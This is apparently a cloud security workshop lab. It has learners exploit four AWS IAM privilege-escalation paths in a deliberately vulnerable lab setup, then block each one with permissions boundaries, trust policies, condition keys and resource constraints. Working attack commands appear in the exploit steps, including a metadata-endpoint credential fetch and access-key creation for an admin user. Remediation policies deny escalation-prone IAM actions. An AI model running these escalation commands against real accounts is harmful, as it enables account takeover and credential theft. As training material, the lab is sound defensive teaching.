# Lab 2 - Fencin' the Frontier: Exploit and Remediate

**Duration:** 45 minutes

## Overview

Execute privilege escalation attacks against iam-vulnerable infrastructure, then apply guardrails to block them. Each exercise follows the pattern: **Exploit → Remediate → Verify**.

**Learning Objectives:**
1. Execute privilege escalation attacks to understand how they work
2. Apply guardrails (permissions boundaries, trust policies, condition keys)
3. Verify that guardrails effectively block attacks
4. Connect attack techniques to appropriate defensive controls

---

## Prerequisites

- Completed Layin' Down the Law (Lab 1) - iam-vulnerable still deployed
- AWS CLI configured with admin credentials for remediation
- Separate profiles for vulnerable users (from terraform output)

---

## Path 1: AttachUserPolicy (Self-Escalation) → Permissions Boundary

**Attack:** Attach AdministratorAccess to self
**Guardrail:** Permissions Boundary
**Reference:** [pathfinding.cloud IAM-007](https://pathfinding.cloud/paths/iam-007)

### Part A: Exploit

1. Configure the vulnerable user profile:
   ```bash
   export AWS_PROFILE=privesc7
   aws sts get-caller-identity
   ```

2. Check current permissions:
   ```bash
   aws iam list-attached-user-policies --user-name privesc7-AttachUserPolicy
   ```

3. Attach AdministratorAccess to yourself:
   ```bash
   aws iam attach-user-policy \
     --user-name privesc7-AttachUserPolicy \
     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
   ```

4. Verify escalation succeeded:
   ```bash
   # List policies - should now include AdministratorAccess
   aws iam list-attached-user-policies --user-name privesc7-AttachUserPolicy

   # Test admin powers - these should now work
   aws s3 ls
   aws iam list-users
   ```

**Discussion:** What PARC element enabled this attack? (`Resource: "*"`)

### Part B: Remediate

Switch to your admin profile to apply the remediation:

```bash
export AWS_PROFILE=admin
```

1. Create a permissions boundary policy that caps effective permissions:

   Save this as `boundary-policy.json`:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Sid": "AllowLimitedActions",
         "Effect": "Allow",
         "Action": [
           "s3:GetObject",
           "s3:ListBucket",
           "ec2:Describe*"
         ],
         "Resource": "*"
       },
       {
         "Sid": "DenyDangerousIAM",
         "Effect": "Deny",
         "Action": [
           "iam:CreateUser",
           "iam:CreateRole",
           "iam:AttachUserPolicy",
           "iam:AttachRolePolicy",
           "iam:PutUserPolicy",
           "iam:PutRolePolicy",
           "iam:CreateAccessKey",
           "iam:UpdateAssumeRolePolicy",
           "iam:DeleteUserPermissionsBoundary"
         ],
         "Resource": "*"
       }
     ]
   }
   ```

2. Create the boundary policy:
   ```bash
   aws iam create-policy \
     --policy-name DeveloperBoundary \
     --policy-document file://boundary-policy.json
   ```

3. Apply the boundary to the user:
   ```bash
   aws iam put-user-permissions-boundary \
     --user-name privesc7-AttachUserPolicy \
     --permissions-boundary arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):policy/DeveloperBoundary
   ```

### Part C: Verify

Switch back to the vulnerable user:

```bash
export AWS_PROFILE=privesc7
```

1. The user still has AdministratorAccess attached:
   ```bash
   aws iam list-attached-user-policies --user-name privesc7-AttachUserPolicy
   # Shows AdministratorAccess
   ```

2. But effective permissions are capped by the boundary:
   ```bash
   # This is ALLOWED by the boundary
   aws s3 ls

   # This is DENIED by the boundary - even with AdministratorAccess!
   aws iam create-user --user-name test-escalation
   # Error: Access Denied

   aws iam create-access-key --user-name admin
   # Error: Access Denied
   ```

**Key Insight:** The boundary is a ceiling—it doesn't matter what policies say, you can't exceed it.

---

## Path 2: UpdateAssumeRolePolicy (Principal Access) → Trust Policy

**Attack:** Modify trust policy to assume a privileged role
**Guardrail:** Resource Policy (Trust Policy) + Identity Policy Deny
**Reference:** [pathfinding.cloud IAM-012](https://pathfinding.cloud/paths/iam-012)

### Part A: Exploit

1. Configure the vulnerable user profile:
   ```bash
   export AWS_PROFILE=privesc14
   aws sts get-caller-identity
   ```

2. Find the target privileged role:
   ```bash
   aws iam list-roles --query "Roles[?contains(RoleName, 'privesc14')].[RoleName,Arn]" --output table
   ```

3. View the current trust policy:
   ```bash
   aws iam get-role --role-name privesc14-TargetRole \
     --query 'Role.AssumeRolePolicyDocument'
   ```

4. Update the trust policy to allow yourself:
   ```bash
   # Get your user ARN
   MY_ARN=$(aws sts get-caller-identity --query Arn --output text)

   # Update trust policy
   aws iam update-assume-role-policy \
     --role-name privesc14-TargetRole \
     --policy-document '{
       "Version": "2012-10-17",
       "Statement": [{
         "Effect": "Allow",
         "Principal": {"AWS": "'$MY_ARN'"},
         "Action": "sts:AssumeRole"
       }]
     }'
   ```

5. Assume the role:
   ```bash
   aws sts assume-role \
     --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/privesc14-TargetRole \
     --role-session-name escalated
   ```

**Discussion:** What is a trust policy, and why is it considered a resource policy?

### Part B: Remediate

Switch to admin profile:

```bash
export AWS_PROFILE=admin
```

**Defense 1:** Add an explicit deny to the user's policy:

1. Create a deny policy:
   ```bash
   aws iam put-user-policy \
     --user-name privesc14-UpdatingAssumeRolePolicy \
     --policy-name DenyTrustPolicyModification \
     --policy-document '{
       "Version": "2012-10-17",
       "Statement": [{
         "Effect": "Deny",
         "Action": "iam:UpdateAssumeRolePolicy",
         "Resource": "*"
       }]
     }'
   ```

**Defense 2:** Harden the trust policy itself:

2. Update the trust policy with explicit principals and conditions:
   ```bash
   aws iam update-assume-role-policy \
     --role-name privesc14-TargetRole \
     --policy-document '{
       "Version": "2012-10-17",
       "Statement": [{
         "Effect": "Allow",
         "Principal": {"Service": "ec2.amazonaws.com"},
         "Action": "sts:AssumeRole"
       }]
     }'
   ```

### Part C: Verify

Switch back to the vulnerable user:

```bash
export AWS_PROFILE=privesc14
```

1. Try to update the trust policy:
   ```bash
   aws iam update-assume-role-policy \
     --role-name privesc14-TargetRole \
     --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}'
   # Error: Access Denied - blocked by explicit deny
   ```

2. Try to assume the role:
   ```bash
   aws sts assume-role \
     --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/privesc14-TargetRole \
     --role-session-name attempt
   # Error: Access Denied - trust policy no longer allows this user
   ```

**Key Insight:** Trust policies ARE resource policies—they control WHO can access the role resource.

---

## Path 3: PassRole + EC2 (New PassRole) → Condition Key

**Attack:** Launch EC2 with a privileged role to steal credentials
**Guardrail:** Condition Key (`iam:PassedToService`) + Resource Constraint
**Reference:** [pathfinding.cloud EC2-001](https://pathfinding.cloud/paths/ec2-001)

### Part A: Exploit

1. Configure the vulnerable user profile:
   ```bash
   export AWS_PROFILE=privesc3
   aws sts get-caller-identity
   ```

2. Find the privileged role and instance profile:
   ```bash
   aws iam list-roles --query "Roles[?contains(RoleName, 'privesc3')].[RoleName]" --output text
   aws iam list-instance-profiles --query "InstanceProfiles[?contains(InstanceProfileName, 'privesc3')].[InstanceProfileName]" --output text
   ```

3. Get a valid AMI ID for your region:
   ```bash
   AMI_ID=$(aws ec2 describe-images \
     --owners amazon \
     --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
     --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
     --output text)
   echo $AMI_ID
   ```

4. Launch EC2 with the privileged role:
   ```bash
   aws ec2 run-instances \
     --image-id $AMI_ID \
     --instance-type t3.micro \
     --iam-instance-profile Name=privesc3-InstanceProfile \
     --query 'Instances[0].InstanceId' \
     --output text
   ```

5. (Conceptual) From within the EC2 instance, credentials would be available at:
   ```bash
   # This would run ON the EC2 instance
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/privesc3-PrivilegedRole
   ```

**Discussion:** What two permissions combined to enable this attack?

### Part B: Remediate

Switch to admin profile:

```bash
export AWS_PROFILE=admin
```

1. Update the user's policy with a `iam:PassedToService` condition and resource constraint:
   ```bash
   aws iam put-user-policy \
     --user-name privesc3-CreateEC2WithExistingIP \
     --policy-name RestrictedPassRole \
     --policy-document '{
       "Version": "2012-10-17",
       "Statement": [
         {
           "Sid": "AllowPassRoleToEC2Only",
           "Effect": "Allow",
           "Action": "iam:PassRole",
           "Resource": "arn:aws:iam::*:role/LimitedEC2Role",
           "Condition": {
             "StringEquals": {
               "iam:PassedToService": "ec2.amazonaws.com"
             }
           }
         },
         {
           "Sid": "AllowEC2Operations",
           "Effect": "Allow",
           "Action": [
             "ec2:RunInstances",
             "ec2:DescribeInstances",
             "ec2:DescribeImages"
           ],
           "Resource": "*"
         }
       ]
     }'
   ```

2. Remove or restrict the original overly-permissive PassRole policy:
   ```bash
   # List and remove inline policies that grant unrestricted PassRole
   aws iam list-user-policies --user-name privesc3-CreateEC2WithExistingIP
   # Delete the original permissive policy if present
   ```

### Part C: Verify

Switch back to the vulnerable user:

```bash
export AWS_PROFILE=privesc3
```

1. Try to launch EC2 with the privileged role:
   ```bash
   aws ec2 run-instances \
     --image-id $AMI_ID \
     --instance-type t3.micro \
     --iam-instance-profile Name=privesc3-InstanceProfile
   # Error: PassRole denied - role not in allowed Resource
   ```

2. The condition also blocks passing roles to other services:
   ```bash
   # If user had lambda:CreateFunction, this would also fail:
   # iam:PassedToService = lambda.amazonaws.com ≠ ec2.amazonaws.com
   ```

**Key Insight:** `iam:PassedToService` ensures roles can only go to specific services—essential for any PassRole permission.

---

## Path 4: CreateAccessKey (Principal Access) → Resource Constraint

**Attack:** Create access keys for other users (including admins)
**Guardrail:** Resource Constraint (`${aws:username}`)
**Reference:** [pathfinding.cloud IAM-002](https://pathfinding.cloud/paths/iam-002)

### Part A: Exploit

1. Configure the vulnerable user profile:
   ```bash
   export AWS_PROFILE=privesc4
   aws sts get-caller-identity
   ```

2. Find admin users to target:
   ```bash
   aws iam list-users --query "Users[].UserName" --output table
   ```

3. Create an access key for another user:
   ```bash
   # Replace 'admin-user' with an actual admin user from your account
   aws iam create-access-key --user-name admin-user
   ```

4. Use the stolen credentials:
   ```bash
   export AWS_ACCESS_KEY_ID=<new-key-id>
   export AWS_SECRET_ACCESS_KEY=<new-secret>
   aws sts get-caller-identity
   # Now shows admin-user
   ```

**Discussion:** Which PARC element was misconfigured?

### Part B: Remediate

Switch to admin profile:

```bash
export AWS_PROFILE=admin
```

1. Replace the permissive policy with one using `${aws:username}`:
   ```bash
   aws iam put-user-policy \
     --user-name privesc4-CreateAccessKey \
     --policy-name ManageOwnKeysOnly \
     --policy-document '{
       "Version": "2012-10-17",
       "Statement": [{
         "Sid": "AllowManageOwnAccessKeys",
         "Effect": "Allow",
         "Action": [
           "iam:CreateAccessKey",
           "iam:DeleteAccessKey",
           "iam:ListAccessKeys",
           "iam:UpdateAccessKey"
         ],
         "Resource": "arn:aws:iam::*:user/${aws:username}"
       }]
     }'
   ```

2. Remove the original permissive policy:
   ```bash
   aws iam list-user-policies --user-name privesc4-CreateAccessKey
   # Delete any policy with Resource: "*" for CreateAccessKey
   ```

### Part C: Verify

Switch back to the vulnerable user:

```bash
export AWS_PROFILE=privesc4
```

1. Try to create keys for another user:
   ```bash
   aws iam create-access-key --user-name admin-user
   # Error: Access Denied
   ```

2. Can still manage own keys:
   ```bash
   aws iam create-access-key --user-name privesc4-CreateAccessKey
   # SUCCESS - self-service is allowed

   # Clean up the test key
   aws iam list-access-keys --user-name privesc4-CreateAccessKey
   aws iam delete-access-key --user-name privesc4-CreateAccessKey --access-key-id <key-id>
   ```

**Key Insight:** `${aws:username}` enables self-service patterns without granting access to other users.

---

## Wrap-up

### Summary Table

| Path | Attack | Before | After | Guardrail Applied |
|---|--------|--------|-------|-------------------|
| 1 | AttachUserPolicy | SUCCESS | Capped by boundary | **Permissions Boundary** |
| 2 | UpdateAssumeRolePolicy | SUCCESS | DENIED | **Trust Policy + Deny** |
| 3 | PassRole + EC2 | SUCCESS | DENIED | **Condition Key** |
| 4 | CreateAccessKey | SUCCESS | DENIED (others) | **Resource Constraint** |

### Defense in Depth

```
┌─────────────────────────────────────────────────────┐
│  1. Identity Policy                                  │  ← What you WANT to allow
│     └─ Path 4: ${aws:username} constraint            │
├─────────────────────────────────────────────────────┤
│  2. Permissions Boundary                             │  ← Maximum you CAN allow
│     └─ Path 1: Caps effective permissions            │
├─────────────────────────────────────────────────────┤
│  3. Resource Policy (Trust Policy)                   │  ← Resource controls WHO
│     └─ Path 2: Explicit principals only              │
├─────────────────────────────────────────────────────┤
│  4. Condition Keys                                   │  ← Context restrictions
│     └─ Path 3: iam:PassedToService                   │
├─────────────────────────────────────────────────────┤
│  5. Service Control Policy (SCP)                     │  ← Org-wide guardrails
│     └─ Not in lab (requires AWS Organizations)       │
└─────────────────────────────────────────────────────┘
```

Each layer provides independent defense. A hole in one layer is blocked by others.

### Key Takeaways

1. **Permissions Boundaries** cap effective permissions—even AdministratorAccess is limited by the boundary
2. **Trust policies ARE resource policies**—they control who can assume roles, independent of identity policies
3. **Condition keys like `iam:PassedToService`** are essential for any policy granting PassRole
4. **`${aws:username}`** enables self-service patterns while blocking access to other principals
5. **Defense in depth** means multiple independent layers—each catches what others miss

---

## Cleanup

When you're done with the workshop, destroy the infrastructure:

```bash
cd labs/terraform
terraform destroy
```

When prompted, type `yes` to confirm.

**Also clean up the policies and boundaries created during remediation:**

```bash
export AWS_PROFILE=admin

# Remove permissions boundary
aws iam delete-user-permissions-boundary --user-name privesc7-AttachUserPolicy

# Delete custom policies
aws iam delete-policy --policy-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):policy/DeveloperBoundary

# Delete inline policies added during remediation
aws iam delete-user-policy --user-name privesc14-UpdatingAssumeRolePolicy --policy-name DenyTrustPolicyModification
aws iam delete-user-policy --user-name privesc3-CreateEC2WithExistingIP --policy-name RestrictedPassRole
aws iam delete-user-policy --user-name privesc4-CreateAccessKey --policy-name ManageOwnKeysOnly
```

---